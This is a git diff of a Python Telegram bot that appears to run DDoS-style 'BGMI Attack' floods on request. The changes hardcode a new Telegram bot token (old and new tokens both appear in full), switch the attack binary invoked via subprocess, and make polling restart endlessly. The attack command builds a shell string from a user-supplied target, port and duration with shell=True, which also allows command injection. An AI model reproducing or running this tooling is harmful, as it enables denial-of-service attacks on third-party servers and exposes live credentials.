@@ -7,7 +7,7 @@ import datetime
 import os
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('7231434237:AAEewQXP6gfHrR8T1rKyA4J4QAodmGgmUNU')
+bot = telebot.TeleBot('7231434237:AAFoUPW6RqKM5qeTy9QCUgzPmzEKfRoc-vM')
 
 # Admin user IDs
 admin_id = ["6060545769","1871909759","948895728","1383324178"]
@@ -320,7 +320,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 200"
+                full_command = f"./Danzer {target} {port} {time} 200"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
@@ -458,4 +458,8 @@ def broadcast_message(message):
 
 
 
-bot.polling()
+while True:
+    try:
+        bot.polling(none_stop=True)
+    except Exception as e:
+        print(e)
